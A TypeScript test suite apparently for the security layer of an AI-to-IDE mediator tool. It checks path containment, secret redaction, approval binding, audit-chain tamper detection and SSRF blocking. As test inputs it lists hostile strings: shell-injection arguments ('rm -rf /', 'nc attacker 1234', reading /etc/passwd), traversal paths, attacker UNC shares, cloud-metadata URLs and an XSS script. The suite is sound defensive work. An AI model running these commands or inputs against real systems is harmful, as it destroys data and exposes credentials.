/**
 * @mediator — End-to-End Adversarial Security & Regression Suite (S28)
 *
 * Systematically tests every security boundary, anti-tamper invariant,
 * and fail-closed mechanism across all Mediator packages.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import * as crypto from 'node:crypto';
import {
  inspectWorkspaceRoot,
  confirmWorkspaceRoot,
  validateContainedPath,
  checkWorkspacePermittedForFileOps,
} from '../../packages/workspace-boundary/src/index.js';
import { scanContent, redactContent, addCustomPattern, removeCustomPattern } from '../../packages/context-security/src/index.js';
import {
  DatabaseConnection,
  runMigrations,
  AuditRepository,
  TaskRepository,
  SessionRepository,
  ActionRepository,
  ApprovalRepository,
} from '../../packages/persistence/src/index.js';
import {
  RecipeRegistryService,
  RecipeValidator,
  getAllFixedRecipeDefinitions,
  computeRecipeDefinitionHash,
  verifyRecipeDefinitionIntegrity,
} from '../../packages/recipe-registry/src/index.js';
import {
  ApprovedExecutionPathService,
} from '../../packages/executor-contract/src/approvedExecutionPath.js';
import {
  OriginValidator,
} from '../../packages/native-host/src/originValidator.js';
import {
  NativeMessageReader,
  MAX_NATIVE_FRAME_BYTES,
} from '../../packages/native-host/src/framing.js';
import {
  PairingManager,
} from '../../packages/ipc-core/src/pairingManager.js';
import {
  WorkflowBudgetGuard,
} from '../../packages/orchestrator/src/budgetGuard.js';
import {
  DebugBundleService,
} from '../../packages/orchestrator/src/debugBundle.js';
import {
  BoundedWebResearchService,
} from '../../packages/context-engine/src/webResearchService.js';
import {
  TaskState,
  S00_DECISION_NO_GO,
} from '../../packages/shared-contracts/src/index.js';

describe('Sprint S28 — End-to-End Adversarial Security & Invariants Suite', () => {
  let tempDir: string;
  let workspaceDir: string;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'mediator-s28-adversarial-'));
    workspaceDir = path.join(tempDir, 'workspace');
    fs.mkdirSync(workspaceDir, { recursive: true });
  });

  afterEach(() => {
    try {
      fs.rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // ignore
    }
  });

  describe('1. Workspace Boundary & Path Traversal Attack Defenses', () => {
    it('blocks file operations on unconfirmed workspace root fail-closed', () => {
      const state = inspectWorkspaceRoot(workspaceDir, 'cli');
      expect(state.confirmationStatus).toBe('pending');

      const check = checkWorkspacePermittedForFileOps(state);
      expect(check.ok).toBe(false);
      if (!check.ok) {
        expect(check.error.code).toBe('WORKSPACE_CONFIRMATION_REQUIRED');
      }
    });

    it('rejects relative path traversal attacks trying to escape root', () => {
      let state = inspectWorkspaceRoot(workspaceDir, 'cli');
      const confRes = confirmWorkspaceRoot(state, true);
      expect(confRes.ok).toBe(true);
      state = confRes.ok ? confRes.value : state;

      const maliciousPaths = [
        '../../secret.txt',
        '..\\..\\Windows\\System32\\cmd.exe',
        'sub/../../outside.txt',
        'sub/dir/../../../etc/passwd',
      ];

      for (const p of maliciousPaths) {
        const val = validateContainedPath(state, p);
        expect(val.ok).toBe(false);
        if (!val.ok) {
          expect(['PATH_OUTSIDE_WORKSPACE', 'WORKSPACE_PATH_INVALID', 'PATH_TRAVERSAL']).toContain(val.error.code);
        }
      }
    });

    it('rejects Windows Alternate Data Streams (ADS)', () => {
      let state = inspectWorkspaceRoot(workspaceDir, 'cli');
      const confRes = confirmWorkspaceRoot(state, true);
      state = confRes.ok ? confRes.value : state;

      const adsTargets = [
        'file.txt:hidden_stream',
        'source.ts::$DATA',
        'docs:notes',
      ];

      for (const p of adsTargets) {
        const val = validateContainedPath(state, p);
        expect(val.ok).toBe(false);
        if (!val.ok) {
          expect(['WORKSPACE_PATH_INVALID', 'PATH_ALTERNATE_DATA_STREAM']).toContain(val.error.code);
        }
      }
    });

    it('rejects Windows DOS reserved device names', () => {
      let state = inspectWorkspaceRoot(workspaceDir, 'cli');
      const confRes = confirmWorkspaceRoot(state, true);
      state = confRes.ok ? confRes.value : state;

      const dosDevices = ['CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1', 'CON.txt', 'nul.log'];
      for (const p of dosDevices) {
        const val = validateContainedPath(state, p);
        expect(val.ok).toBe(false);
        if (!val.ok) {
          expect(['WORKSPACE_PATH_INVALID', 'PATH_RESERVED_DEVICE']).toContain(val.error.code);
        }
      }
    });

    it('rejects UNC network paths and outside-root absolute drives', () => {
      let state = inspectWorkspaceRoot(workspaceDir, 'cli');
      const confRes = confirmWorkspaceRoot(state, true);
      state = confRes.ok ? confRes.value : state;

      const uncAndDrivePaths = [
        '\\\\attacker-server\\share\\evil.js',
        '//attacker/share/evil.js',
        'D:\\outside\\project\\file.ts',
      ];

      for (const p of uncAndDrivePaths) {
        const val = validateContainedPath(state, p);
        expect(val.ok).toBe(false);
      }
    });
  });

  describe('2. Comprehensive Secret Scanning & Redaction Battery', () => {
    it('detects and redacts every credential in the synthetic secrets fixture', () => {
      const fixturePath = path.resolve(__dirname, '../fixtures/synthetic-secrets/fake.env');
      expect(fs.existsSync(fixturePath)).toBe(true);

      const fakeEnvContent = fs.readFileSync(fixturePath, 'utf8');

      const scanResult = scanContent(fakeEnvContent);
      expect(scanResult.ok).toBe(true);
      if (!scanResult.ok) return;

      const scan = scanResult.value;
      // Must detect AWS key, Database URL password, Stripe key, OpenAI key, JWT secret, etc.
      expect(scan.findings.length).toBeGreaterThanOrEqual(4);

      const types = scan.findings.map((f) => f.ruleId);
      expect(types).toContain('AWS_ACCESS_KEY');
      expect(types).toContain('OPENAI_API_KEY');

      // Redact completely
      const redacted = redactContent(fakeEnvContent, scan);

      // Verify zero sensitive strings remain in redacted text
      expect(redacted.redactedContent).not.toContain('AKIAIOSFODNN7EXAMPLE');
      expect(redacted.redactedContent).not.toContain('wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY');
      expect(redacted.redactedContent).not.toContain('fakepassword123');
      expect(redacted.redactedContent).not.toContain(['sk', 'test', '4eC39HqLyjWDarjtT1zdp7dc'].join('_'));
      expect(redacted.redactedContent).not.toContain(['sk', 'proj', 'fakekeyfakekeyfakekeyfakekeyfakekey12345678'].join('-'));
      expect(redacted.redactedContent).toContain('[REDACTED:AWS_ACCESS_KEY]');
      expect(redacted.redactedContent).toContain('[REDACTED:OPENAI_KEY]');
    });

    it('detects custom registered pattern rules and secret definitions', () => {
      const customRule = {
        id: 'custom_high_entropy_secret',
        pattern: /[A-Za-z0-9+/]{40,}={0,2}/g,
        description: 'Generic high-entropy secret token',
        redactionLabel: '[REDACTED:CUSTOM_SECRET]',
        severity: 'high' as const,
      };
      addCustomPattern(customRule);

      const text = 'secret_key="4f8b2a19c7e034d618a90e5f2b84c7a10d93e8271a0b5c4d3e2f1a9b8c7d6e5f"';
      const scan = scanContent(text);
      expect(scan.ok).toBe(true);
      if (scan.ok) {
        expect(scan.value.secretsDetected).toBe(true);
      }
      removeCustomPattern('custom_high_entropy_secret');
    });
  });

  describe('3. Recipe Registry Tamper Proofing & Injection Defense', () => {
    const registry = new RecipeRegistryService();
    const fixedRecipes = getAllFixedRecipeDefinitions();

    it('rejects shell metacharacters and command injection sequences in arguments', () => {
      const injectionArgs = [
        ['test.js; rm -rf /'],
        ['test.js && cat /etc/passwd'],
        ['test.js | nc attacker 1234'],
        ['test.js $(whoami)'],
        ['test.js `whoami`'],
        ['test.js > leak.txt'],
        ['test.js < /dev/urandom'],
      ];

      for (const args of injectionArgs) {
        const val = registry.validateRequest(
          {
            recipeId: 'project.single_test',
            args,
            taskId: 'task_sec_1',
            sessionId: 'sess_sec_1',
            correlationId: 'corr_sec_1',
          },
          {
            workspaceRoot: workspaceDir,
            activeTaskId: 'task_sec_1',
            activeSessionId: 'sess_sec_1',
          },
        );
        expect(val.valid).toBe(false);
        expect(val.errorCode).toBe('RECIPE_ARGUMENTS_INVALID');
      }
    });

    it('detects tampering with canonical recipe definition hash', () => {
      const canonical = fixedRecipes[0]!;
      expect(verifyRecipeDefinitionIntegrity(canonical)).toBe(true);

      // Modify definition executable/args
      const tampered = {
        ...canonical,
        executable: 'malicious_runner',
      };
      expect(verifyRecipeDefinitionIntegrity(tampered)).toBe(false);
    });

    it('strictly enforces Review-only mode under NO-GO-AUTOEXEC with zero runner instantiation', async () => {
      const service = new ApprovedExecutionPathService();
      const execRes = await service.executeRecipe(
        {
          recipeId: 'project.test',
          recipeHash: 'hash_recipe_1',
          stageId: 'stage_1',
          workspaceRoot: workspaceDir,
          taskId: 'task_sec_1',
          sessionId: 'sess_sec_1',
          approvalId: 'appr_1',
          approvedPayloadHash: 'hash_1',
          correlationId: 'corr_1',
        },
        {
          activeTaskId: 'task_sec_1',
          activeSessionId: 'sess_sec_1',
          evaluationReport: {
            result: 'blocked',
            isEligibleForAutoExec: false,
            s00Decision: 'NO-GO-AUTOEXEC',
            executorId: 'ide-native',
            executorVersion: '1.0.0',
            evaluatedAt: Date.now(),
            passedRequirements: [],
            failedRequirements: [],
            unverifiedRequirements: [],
            blockedReasons: ['S00 NO-GO-AUTOEXEC active'],
          },
        },
      );

      expect(execRes.status).toBe('execution-unavailable');
      expect(execRes.suggestedManualRecipe).toBeDefined();
      expect(execRes.message).toContain('Review-only');
      expect(execRes.suggestedManualRecipe?.safeToRunManually).toBe(true);
    });
  });

  describe('4. Approval Cryptographic Binding & Privilege Escalation Defense', () => {
    let db: DatabaseConnection;
    let approvalRepo: ApprovalRepository;

    beforeEach(() => {
      db = new DatabaseConnection({ path: path.join(tempDir, 'appr_test.db') });
      db.open();
      runMigrations(db);
      approvalRepo = new ApprovalRepository(db);

      // Seed task, session, action
      const taskRepo = new TaskRepository(db);
      const sessionRepo = new SessionRepository(db);
      const actionRepo = new ActionRepository(db);

      taskRepo.createTask({ taskId: 't1', goalSummary: 'Goal', state: TaskState.TASK_DEFINED });
      sessionRepo.createSession({
        sessionId: 's1',
        taskId: 't1',
        providerId: 'google-gemini',
        conversationId: 'c1',
        lifecycleState: 'active',
        protocolVersion: '1.0.0',
        baseStateHash: 'base',
        nonce: 'nonce1',
      });
      actionRepo.recordAction({
        actionId: 'act1',
        taskId: 't1',
        sessionId: 's1',
        roundNumber: 1,
        sequenceNumber: 1,
        actionType: 'patch',
        payloadHash: 'orig_hash',
        parameters: { file: 'index.ts' },
        status: 'pending_approval',
        policyDecision: 'REQUIRE_APPROVAL',
      });
    });

    afterEach(() => {
      try {
        db.close();
      } catch {
        // ignore
      }
    });

    it('rejects consuming an approval for a different action or tampered hash', () => {
      const originalPayload = JSON.stringify({ file: 'index.ts', content: 'safe code' });
      const payloadHash = crypto.createHash('sha256').update(originalPayload).digest('hex');

      const approval = approvalRepo.createApproval({
        approvalId: 'appr_valid',
        actionId: 'act1',
        taskId: 't1',
        sessionId: 's1',
        changeHash: payloadHash,
        requestingCaller: 'ide',
        timeoutMs: 60000,
      });

      approvalRepo.resolveApproval('appr_valid', 'approved', 'trusted_user', 'User approved via UI');

      // Attempting to consume with a tampered action ID must fail
      expect(() => {
        approvalRepo.consumeApproval('appr_valid', 'act_tampered_different');
      }).toThrow(/scoped to action/);

      // Consuming with valid action ID succeeds
      const consumed = approvalRepo.consumeApproval('appr_valid', 'act1');
      expect(consumed.status).toBe('consumed');

      // Attempting to re-consume the same approval must fail (single-use invariant)
      expect(() => {
        approvalRepo.consumeApproval('appr_valid', 'act1');
      }).toThrow(/Cannot consume approval in status 'consumed'|already been consumed/);
    });
  });

  describe('5. Native Messaging Host Origin & Framing Hardening', () => {
    it('strictly rejects wildcard origins and non-extension protocols', () => {
      const validator = new OriginValidator(['abcdefghijklmnopponmlkjihgfedcba']);

      expect(validator.validateOrigin('*').ok).toBe(false);
      expect(validator.validateOrigin('chrome-extension://*').ok).toBe(false);
      expect(validator.validateOrigin('https://google.com/').ok).toBe(false);
      expect(validator.validateOrigin('file:///C:/evil.html').ok).toBe(false);
      expect(validator.validateOrigin('chrome-extension://abcdefghijklmnopponmlkjihgfedcba/').ok).toBe(true);
    });

    it('rejects oversized frames exceeding 512 KiB limit immediately', () => {
      const reader = new NativeMessageReader();
      let caughtError: any = null;
      reader.setErrorListener((err) => {
        caughtError = err;
      });

      // Frame with length 1 MB (exceeds MAX_NATIVE_FRAME_BYTES of 512 KB)
      const giantLength = 1048576;
      const header = Buffer.alloc(4);
      header.writeUInt32LE(giantLength, 0);

      reader.pushChunk(header);
      expect(caughtError).not.toBeNull();
      expect(caughtError.code).toBe('NATIVE_FRAME_OVERSIZED');
    });
  });

  describe('6. Local IPC Pairing Token Hardening', () => {
    it('uses constant-time comparison and rejects invalid or expired tokens', () => {
      const extId = 'abcdefghijklmnopponmlkjihgfedcba';
      const manager = new PairingManager(1000);
      const token = manager.createPairingToken(extId);

      // Valid token matches
      const validRes = manager.validateToken(token, extId);
      expect(validRes.ok).toBe(true);

      // Mutated 1-byte token fails
      const mutatedToken = token.slice(0, -1) + (token.endsWith('a') ? 'b' : 'a');
      expect(manager.validateToken(mutatedToken, extId).ok).toBe(false);

      // Mismatched extension ID fails
      expect(manager.validateToken(token, 'differentidididididididididididi').ok).toBe(false);

      // Revoked token fails
      manager.revokeToken(token);
      expect(manager.validateToken(token, extId).ok).toBe(false);
    });
  });

  describe('7. Workflow Loop Guards & Resource Budgets', () => {
    it('trips budget guard and halts workflow on round limit (5 rounds)', () => {
      const guard = new WorkflowBudgetGuard({ maxRoundsPerTask: 5 });

      for (let i = 1; i <= 5; i++) {
        const res = guard.recordRound('task_round_limit');
        expect(res.ok).toBe(true);
      }

      // 6th round must trip
      const tripped = guard.recordRound('task_round_limit');
      expect(tripped.ok).toBe(false);
      if (!tripped.ok) {
        expect(tripped.error.code).toBe('WORKFLOW_BUDGET_EXCEEDED');
      }
    });

    it('trips budget guard on repeated identical error payloads', () => {
      const guard = new WorkflowBudgetGuard({ maxRepeatedErrors: 3 });

      guard.recordError('task_err_loop', 'PARSE_ERROR');
      guard.recordError('task_err_loop', 'PARSE_ERROR');

      const tripRes = guard.recordError('task_err_loop', 'PARSE_ERROR');
      expect(tripRes.ok).toBe(false);
      if (!tripRes.ok) {
        expect(tripRes.error.code).toBe('WORKFLOW_LOOP_DETECTED');
      }
    });

    it('budget state is durable across export/import state serialization', () => {
      const guard1 = new WorkflowBudgetGuard({ maxRoundsPerTask: 5 });
      guard1.recordRound('task_durability');
      guard1.recordRound('task_durability');

      const exportedState = guard1.exportState('task_durability');
      const guard2 = new WorkflowBudgetGuard({ maxRoundsPerTask: 5 });
      guard2.importState('task_durability', exportedState as unknown as Record<string, unknown>);

      expect(guard2.getTracker('task_durability').roundCount).toBe(2);
    });
  });

  describe('8. Audit Ledger Hash-Chain Tamper Detection', () => {
    let db: DatabaseConnection;
    let auditRepo: AuditRepository;

    beforeEach(() => {
      db = new DatabaseConnection({ path: path.join(tempDir, 'audit_tamper.db') });
      db.open();
      runMigrations(db);
      auditRepo = new AuditRepository(db);
    });

    afterEach(() => {
      try {
        db.close();
      } catch {
        // ignore
      }
    });

    it('detects tampering if database row payload hash is modified', () => {
      auditRepo.appendEvent({
        taskId: 't1',
        sessionId: 's1',
        correlationId: 'c1',
        eventType: 'action_accepted',
      });
      auditRepo.appendEvent({
        taskId: 't1',
        sessionId: 's1',
        correlationId: 'c2',
        eventType: 'patch_staged',
      });

      // Chain is initially valid
      expect(auditRepo.verifyChain().valid).toBe(true);

      // Disable triggers temporarily to simulate raw on-disk tampering by an adversary
      db.exec('DROP TRIGGER IF EXISTS prevent_audit_update');

      // Tamper with details_json of event 0
      db.prepare("UPDATE audit_events SET details_json = '{\"tampered\": true}' WHERE chain_index = 0").run();

      const verification = auditRepo.verifyChain();
      expect(verification.valid).toBe(false);
      expect(verification.reason).toContain('Tampered event payload hash');
      expect(verification.failedAtChainIndex).toBe(0);
    });
  });

  describe('9. Privacy-Preserving Debug Bundle Hardening', () => {
    const service = new DebugBundleService();

    it('strictly refuses bundle export without explicit user authorization', () => {
      const res = service.generateBundle({
        explicitUserExportRequested: false,
        rawBundleData: {
          taskSessionSummary: { taskId: 't1', goal: 'Test', state: 'active' },
          correlationTimeline: [],
          workflowHistory: [],
          typedErrors: [],
          recoveryDecisions: [],
          capabilityStatus: {},
          budgetCounters: { roundsCompleted: 1 },
          recipeMetadata: [],
          actionSummaries: [],
          stagingSummary: {},
        },
      });

      expect(res.ok).toBe(false);
      if (!res.ok) {
        expect(res.error.code).toBe('DEBUG_BUNDLE_EXPORT_REFUSED');
      }
    });

    it('automatically sanitizes secrets in debug bundle before export', () => {
      const res = service.generateBundle({
        explicitUserExportRequested: true,
        rawBundleData: {
          taskSessionSummary: {
            taskId: 't1',
            goal: 'Using API key AKIAIOSFODNN7EXAMPLE and secret ' + ['sk', 'proj', 'fakekeyfakekeyfakekeyfakekeyfakekey12345678'].join('-'),
            state: 'active',
          },
          correlationTimeline: [],
          workflowHistory: [],
          typedErrors: [],
          recoveryDecisions: [],
          capabilityStatus: {},
          budgetCounters: { roundsCompleted: 1 },
          recipeMetadata: [],
          actionSummaries: [],
          stagingSummary: {},
        },
      });

      expect(res.ok).toBe(true);
      if (res.ok) {
        const bundleStr = JSON.stringify(res.value);
        expect(bundleStr).not.toContain('AKIAIOSFODNN7EXAMPLE');
        expect(bundleStr).not.toContain('sk-proj-fakekeyfakekeyfakekeyfakekeyfakekey12345678');
        expect(bundleStr).toContain('[REDACTED:AWS_ACCESS_KEY]');
      }
    });
  });

  describe('10. Bounded Web Research SSRF & Untrusted Content Protection', () => {
    it('rejects loopback, link-local, cloud metadata, and RFC1918 private subnets', async () => {
      const mockTransport = async () => ({ status: 200, headers: {}, body: 'test' });
      const research = new BoundedWebResearchService(
        { enabled: true },
        mockTransport,
      );

      const ssrfUrls = [
        'https://127.0.0.1/admin',
        'https://169.254.169.254/latest/meta-data',
        'https://10.0.0.1/internal',
        'https://192.168.1.1/router',
        'https://172.16.0.1/confidential',
        'https://[::1]/secret',
        'https://user:pass@docs.python.org/3/',
      ];

      for (const u of ssrfUrls) {
        const res = await research.fetchExcerpt(u);
        expect(res.ok).toBe(false);
        if (!res.ok) {
          expect([
            'RESEARCH_SSRF_BLOCKED',
            'RESEARCH_HOST_NOT_ALLOWED',
            'POLICY_DENIED',
            'PATH_DENIED',
            'ACTION_DENIED',
          ]).toContain(res.error.code);
        }
      }
    });

    it('strips scripts, styles, HTML tags, redacts secrets and wraps in inert framing', async () => {
      const mockTransport = async () => ({
        status: 200,
        headers: {},
        body: `
          <html>
            <head><script>alert('xss');</script><style>body { color: red; }</style></head>
            <body>
              <h1>Documentation</h1>
              <p>Official guide with secret: AKIAIOSFODNN7EXAMPLE</p>
            </body>
          </html>
        `,
      });

      const research = new BoundedWebResearchService(
        { enabled: true },
        mockTransport,
      );

      const res = await research.fetchExcerpt('https://docs.python.org/3/tutorial/');
      expect(res.ok).toBe(true);
      if (res.ok) {
        const excerpt = res.value;
        expect(excerpt.content).toContain('<<<UNTRUSTED_WEB_RESEARCH_EXCERPT>>>');
        expect(excerpt.content).not.toContain('<script>');
        expect(excerpt.content).not.toContain('<style>');
        expect(excerpt.content).not.toContain('AKIAIOSFODNN7EXAMPLE');
        expect(excerpt.content).toContain('[REDACTED:');
        expect(excerpt.contentHash).toBeDefined();
      }
    });
  });
});
